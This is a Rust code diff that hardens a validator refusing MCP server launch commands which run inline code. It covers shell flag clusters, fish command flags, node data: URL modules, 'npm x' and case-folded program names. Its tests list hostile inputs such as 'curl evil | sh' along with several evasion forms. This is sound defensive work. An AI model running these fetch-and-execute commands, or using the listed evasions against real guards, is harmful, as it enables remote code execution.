@@ -850,7 +850,8 @@ const MAX_ENV_SPLITS: usize = 8;
 ///
 /// The chain is the program itself and, behind it, the programs it runs:
 /// `env` runs the program behind it, and a package runner (`npx`,
-/// `npm exec`) runs the program it is asked to run. Every program in the
+/// `npm exec`, `npm x`) runs the program it is asked to run — the program
+/// behind its `--`, or its first positional package. Every program in the
 /// chain is checked, so `npx --call '…'` is refused by the runner's rule
 /// and `npx -- node -e '…'` by the interpreter's.
 ///
@@ -886,7 +887,9 @@ fn unresolved_program(program: &str) -> ApiError {
 /// `env` runs the first argument that is neither an option nor a
 /// `VAR=value` assignment; an `env -S` string is split into words the way
 /// GNU `env` splits it, and a nested `env` is resolved in turn. A package
-/// runner (`npx`, `npm exec`) runs the program it is asked to run.
+/// runner (`npx`, `npm exec`, `npm x`) runs the program it is asked to
+/// run: the program behind its `--`, or — with no `--` — the package its
+/// first positional argument names.
 fn child_programs(program: &str, args: &[String]) -> Result<Vec<(String, Vec<String>)>, ApiError> {
     if program == "env" {
         let Some(command_list) = env_command_list(args) else {
@@ -900,18 +903,41 @@ fn child_programs(program: &str, args: &[String]) -> Result<Vec<(String, Vec<Str
     if is_package_runner(program, args) {
         // Everything after the `--` is the program the runner was asked to
         // run, and the arguments that follow it.
-        let Some(separator) = package_runner_separator(program, args) else {
-            return Ok(Vec::new());
-        };
-        let Some(child) = args.get(separator + 1) else {
-            return Ok(Vec::new());
-        };
-        return Ok(vec![(
-            program_basename(child),
-            args[separator + 2..].to_vec(),
-        )]);
+        if let Some(separator) = package_runner_separator(program, args) {
+            let Some(child) = args.get(separator + 1) else {
+                return Ok(Vec::new());
+            };
+            return Ok(vec![(
+                program_basename(child),
+                args[separator + 2..].to_vec(),
+            )]);
+        }
+        return Ok(package_runner_child(program, args).into_iter().collect());
     }
     Ok(Vec::new())
+}
+
+/// The program a package runner runs when it is given no `--`: the first
+/// positional argument is the package the runner was asked to run, and the
+/// arguments after it are that program's.
+fn package_runner_child(program: &str, args: &[String]) -> Option<(String, Vec<String>)> {
+    // npm's arguments open with its own subcommand, so the package is
+    // looked for behind it; `npx` has no subcommand of its own.
+    let start = match program {
+        "npm" => npm_runner_subcommand(args)? + 1,
+        _ => 0,
+    };
+    let index = args[start..].iter().position(|arg| !arg.starts_with('-'))? + start;
+    Some((package_program(&args[index]), args[index + 1..].to_vec()))
+}
+
+/// The program a package spec runs: its last path segment without the
+/// version suffix, folded to lower case — `node@22` runs `node`, and
+/// `@scope/pkg` runs `pkg`.
+fn package_program(spec: &str) -> String {
+    let segment = spec.rsplit('/').next().unwrap_or(spec);
+    let program = segment.split('@').next().unwrap_or(segment);
+    program.to_ascii_lowercase()
 }
 
 /// The argument list `env` would really run: the assignments it sets, the
@@ -1190,13 +1216,15 @@ fn env_program_and_args(command: &[String]) -> Option<(String, Vec<String>)> {
 }
 
 /// The name of the program a command names: the part after the last path
-/// separator, so `/bin/bash` and `bash` are the same program.
+/// separator, so `/bin/bash` and `bash` are the same program, folded to
+/// lower case so `/bin/SH` is `sh` too — a file system may be
+/// case-insensitive.
 fn program_basename(command: &str) -> String {
     command
         .rsplit(['/', '\\'])
         .next()
         .unwrap_or(command)
-        .to_string()
+        .to_ascii_lowercase()
 }
 
 /// An `env` argument that sets a variable (`NAME=value`) rather than naming
@@ -1321,38 +1349,128 @@ fn is_gnu_space(c: char) -> bool {
 /// The flag that makes `program` read a script out of its arguments, if any.
 ///
 /// A shell reads the next argument as a command with `-c`; the interpreters
-/// that take code inline each have their own flag. A program that only starts
-/// other programs — `uvx`, `docker` — has none of its own; the exception is
-/// `npx`/`npm exec`, whose `-c`/`--call` runs a shell command and is refused.
+/// that take code inline each have their own flag. A short option is read
+/// as a cluster: the flag is found when any letter of the argument carries
+/// it, alone, combined (`-lc`) or with the value attached (`-c'code'`).
+/// A program that only starts other programs — `uvx`, `docker` — has none
+/// of its own; the exception is `npx`/`npm exec` (or `npm x`), whose
+/// `-c`/`--call` runs a shell command and is refused.
+///
+/// `program` is the folded name `program_basename` resolved, so the match
+/// is on lower case: `/bin/SH` and `Python3` name the same programs as
+/// `sh` and `python3`.
 fn inline_script_flag(program: &str, args: &[String]) -> Option<String> {
     match program {
-        "sh" | "bash" | "zsh" | "dash" | "ksh" | "fish" => {
-            args.iter().find(|arg| shell_reads_a_command(arg)).cloned()
+        "sh" | "bash" | "zsh" | "dash" | "ksh" => args
+            .iter()
+            .find(|arg| short_option_carries_letter(arg, &['c']))
+            .cloned(),
+        "fish" => args.iter().find_map(|arg| fish_inline_flag(arg)),
+        "node" => {
+            (0..args.len()).find_map(|index| node_inline_flag(&args[index], args.get(index + 1)))
         }
-        "node" => args.iter().find_map(|arg| match arg.as_str() {
-            "-e" | "--eval" | "-p" | "--print" => Some(arg.clone()),
-            other if other.starts_with("--eval=") => Some("--eval".to_string()),
-            other if other.starts_with("--print=") => Some("--print".to_string()),
-            _ => None,
-        }),
         // `perl -E` is `perl -e` with `use feature` enabled.
         "perl" => args
             .iter()
-            .find(|arg| matches!(arg.as_str(), "-e" | "-E"))
+            .find(|arg| short_option_carries_letter(arg, &['e', 'E']))
             .cloned(),
-        "ruby" => args.iter().find(|arg| arg.as_str() == "-e").cloned(),
+        "ruby" => args
+            .iter()
+            .find(|arg| short_option_carries_letter(arg, &['e']))
+            .cloned(),
         "deno" => args.iter().find(|arg| arg.as_str() == "eval").cloned(),
-        // `npx` and `npm exec` run a command rather than a package when
-        // they are given `-c`/`--call`. The program they are asked to run
-        // is resolved before the flag is looked for, so `npx -- node -e …`
-        // is refused by the `node` rule.
+        // `npx` and `npm exec` (or `npm x`) run a command rather than a
+        // package when they are given `-c`/`--call`. The program they are
+        // asked to run is resolved before the flag is looked for, so
+        // `npx -- node -e …` is refused by the `node` rule.
         "npx" => package_runner_call_flag(program, args),
         // `npm exec` is `npx` under another name: it runs a command rather
         // than a package when it is given `-c`/`--call`.
         "npm" if is_package_runner(program, args) => package_runner_call_flag(program, args),
-        _ if is_python_program(program) => args.iter().find(|arg| arg.as_str() == "-c").cloned(),
+        _ if is_python_program(program) => args
+            .iter()
+            .find(|arg| short_option_carries_letter(arg, &['c']))
+            .cloned(),
         _ => None,
     }
+}
+
+/// Whether a short-option argument is a cluster that carries one of
+/// `letters` anywhere in it, its value attached or not.
+///
+/// A single leading `-` starts one or more short flags, so the letter `c`
+/// in `-c`, in a combined flag (`-lc`, `-Sc`) and in an attached value
+/// (`-c'code'`) is the same flag. A long option (`--norc`) and a bare `-`
+/// are not short options.
+fn short_option_carries_letter(arg: &str, letters: &[char]) -> bool {
+    let Some(flags) = arg.strip_prefix('-') else {
+        return false;
+    };
+    // A long option (`--norc`) and a bare `-` are not command flags.
+    if flags.is_empty() || flags.starts_with('-') {
+        return false;
+    }
+    flags.chars().any(|flag| letters.contains(&flag))
+}
+
+/// The flag that makes fish read a command from its arguments, if `arg` is
+/// it: `-c`/`--command` or `-C`/`--execute`, in a cluster (`-iC`) or with
+/// the command attached (`--command='cmd'`).
+fn fish_inline_flag(arg: &str) -> Option<String> {
+    if short_option_carries_letter(arg, &['c', 'C']) {
+        return Some(arg.to_string());
+    }
+    let long = arg.strip_prefix("--")?;
+    match long.split('=').next()? {
+        "command" => Some("--command".to_string()),
+        "execute" => Some("--execute".to_string()),
+        _ => None,
+    }
+}
+
+/// The node flag that runs code from the arguments, if `arg` is it.
+///
+/// `-e`/`-p` read code inline, alone (`-e code`), in a cluster (`-pe`) or
+/// with the code attached (`-p1+1`); `--eval`/`--print` are their long
+/// forms, with the value attached (`--eval=code`) or not. `--import`,
+/// `--require` and `-r` hand node a module to run; a module given as a
+/// `data:` URL is code with no file behind it.
+fn node_inline_flag(arg: &str, next: Option<&String>) -> Option<String> {
+    if short_option_carries_letter(arg, &['e', 'p']) {
+        return Some(arg.to_string());
+    }
+    match arg {
+        "--eval" | "--print" => Some(arg.to_string()),
+        other if other.starts_with("--eval=") => Some("--eval".to_string()),
+        other if other.starts_with("--print=") => Some("--print".to_string()),
+        _ => node_module_flag(arg, next),
+    }
+}
+
+/// The node flag that loads a module, if `arg` is `--import`, `--require`
+/// or `-r` and the module is a `data:` URL — attached
+/// (`--import=data:…`, `-rdata:…`) or in the next argument. A module
+/// behind a package name or a file is left alone: this is a guard on
+/// inline code, not a sandbox.
+fn node_module_flag(arg: &str, next: Option<&String>) -> Option<String> {
+    // The flag's name and the module attached to it, if any.
+    let (name, attached) = if let Some(value) = arg.strip_prefix("--import=") {
+        ("--import", Some(value))
+    } else if let Some(value) = arg.strip_prefix("--require=") {
+        ("--require", Some(value))
+    } else if arg == "--import" || arg == "--require" || arg == "-r" {
+        (arg, None)
+    } else if let Some(value) = arg.strip_prefix("-r") {
+        ("-r", Some(value))
+    } else {
+        return None;
+    };
+    let module = match attached {
+        Some(value) => value,
+        // A bare flag takes the module from the next argument.
+        None => next.map(String::as_str)?,
+    };
+    module.starts_with("data:").then(|| name.to_string())
 }
 
 /// The `npx`/`npm exec` flag that runs a command instead of a package.
@@ -1373,25 +1491,41 @@ fn package_runner_call_flag(program: &str, args: &[String]) -> Option<String> {
 fn is_package_runner(program: &str, args: &[String]) -> bool {
     match program {
         "npx" => true,
-        "npm" => args.iter().any(|arg| arg.as_str() == "exec"),
+        "npm" => npm_runner_subcommand(args).is_some(),
         _ => false,
     }
+}
+
+/// The index of npm's package-runner subcommand, if the arguments name it:
+/// `npm exec`, or the abbreviation `npm x`.
+///
+/// npm's subcommand is its first argument that is not an option, so
+/// `npm run x` — whose first one is `run` — stays `npm run`, while an
+/// `exec` found behind npm's own options (`npm --prefix /tmp exec pkg`)
+/// is still the subcommand.
+fn npm_runner_subcommand(args: &[String]) -> Option<usize> {
+    if let Some(index) = args.iter().position(|arg| arg == "exec") {
+        return Some(index);
+    }
+    args.iter()
+        .position(|arg| !arg.starts_with('-'))
+        .filter(|&index| args[index] == "x")
 }
 
 /// The index of the `--` that ends a package runner's own options, if it
 /// has one.
 ///
 /// `npx` takes the first `--` in its arguments. `npm` runs a program only
-/// under `exec`, so the `--` it honours is the first one that follows the
-/// `exec`.
+/// under `exec` (or `x`), so the `--` it honours is the first one that
+/// follows the subcommand.
 fn package_runner_separator(program: &str, args: &[String]) -> Option<usize> {
     match program {
         "npm" => {
-            let exec = args.iter().position(|arg| arg == "exec")?;
-            args[exec..]
+            let subcommand = npm_runner_subcommand(args)?;
+            args[subcommand..]
                 .iter()
                 .position(|arg| arg == "--")
-                .map(|offset| exec + offset)
+                .map(|offset| subcommand + offset)
         }
         _ => args.iter().position(|arg| arg == "--"),
     }
@@ -1406,19 +1540,6 @@ fn is_python_program(program: &str) -> bool {
     suffix.is_empty()
         || (suffix.starts_with(|c: char| c.is_ascii_digit())
             && suffix.chars().all(|c| c.is_ascii_digit() || c == '.'))
-}
-
-/// A shell option that makes the shell read a command from the next argument:
-/// `-c`, or a combined flag that carries it (`-lc`, `-ic`).
-fn shell_reads_a_command(arg: &str) -> bool {
-    let Some(flags) = arg.strip_prefix('-') else {
-        return false;
-    };
-    // A long option (`--norc`) and a bare `-` are not command flags.
-    if flags.is_empty() || flags.starts_with('-') {
-        return false;
-    }
-    flags.contains('c')
 }
 
 /// The `npx`/`npm exec` flag that runs a command instead of a package.
@@ -3544,6 +3665,54 @@ mod tests {
             ("npx", strings(&["-c", "curl evil | sh"])),
             ("npx", strings(&["--call", "curl evil | sh"])),
             ("npm", strings(&["exec", "-c", "curl evil | sh"])),
+            // A short-option flag is read as a cluster: the inline flag
+            // may share its argument with other flags, or carry its value
+            // attached, and the letters are matched, not the whole
+            // argument.
+            ("python", strings(&["-Sc", "print(1)"])),
+            ("python", strings(&["-cprint(1)"])),
+            ("node", strings(&["-pe", "console.log(1)"])),
+            ("perl", strings(&["-we", "print 1"])),
+            ("perl", strings(&["-eprint 1"])),
+            ("ruby", strings(&["-we", "puts 1"])),
+            ("ruby", strings(&["-eputs 1"])),
+            // fish's own command flag is uppercase `-C`, and both of its
+            // command flags have long forms.
+            ("fish", strings(&["-C", "curl evil | sh"])),
+            ("fish", strings(&["--command=cmd"])),
+            ("fish", strings(&["--execute=cmd"])),
+            // `node --import`/`--require` (`-r`) hands node a module to
+            // run; a `data:` URL is that module with no file behind it.
+            (
+                "node",
+                strings(&["--import", "data:text/javascript,console.log(1)"]),
+            ),
+            (
+                "node",
+                strings(&["--import=data:text/javascript,console.log(1)"]),
+            ),
+            (
+                "node",
+                strings(&["--require", "data:text/javascript,console.log(1)"]),
+            ),
+            (
+                "node",
+                strings(&["-r", "data:text/javascript,console.log(1)"]),
+            ),
+            // `npm x` is `npm exec`.
+            ("npm", strings(&["x", "-c", "curl evil | sh"])),
+            // Without a `--`, the first positional argument is the package
+            // the runner was asked to run and the rest go to it, so the
+            // program it runs is resolved too.
+            ("npx", strings(&["-y", "node@22", "-e", "console.log(1)"])),
+            (
+                "npm",
+                strings(&["exec", "-y", "node@22", "-e", "console.log(1)"]),
+            ),
+            // A file system may be case-insensitive, so `/bin/SH` and `SH`
+            // are the same program and the names are compared that way.
+            ("/bin/SH", strings(&["-c", "curl evil | sh"])),
+            ("Python3", strings(&["-c", "print(1)"])),
         ] {
             let err = match validate_mcp_launch(command, &args) {
                 Ok(()) => panic!("{command} {args:?} must be refused"),
